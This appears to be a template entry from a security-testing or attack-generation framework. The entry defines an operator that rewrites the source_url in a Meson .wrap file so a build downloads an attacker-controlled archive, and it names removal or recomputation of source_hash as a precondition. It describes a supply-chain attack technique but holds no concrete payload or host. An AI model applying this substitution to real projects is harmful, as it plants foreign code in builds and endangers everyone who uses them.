name: Wrap source URL substitution
description: Redirect a subproject's download to an attacker-controlled archive by rewriting the source_url in a .wrap file, so the build fetches substituted code instead of the legitimate upstream release.

placeholders.WRAP_FILE: relative path to the .wrap file being modified
placeholders.ORIGINAL_URL: the legitimate source_url currently in the wrap file

preconditions: project has at least one [wrap-file] subproject with a source_url
source_hash is absent, or is removed/recomputed by a companion operator
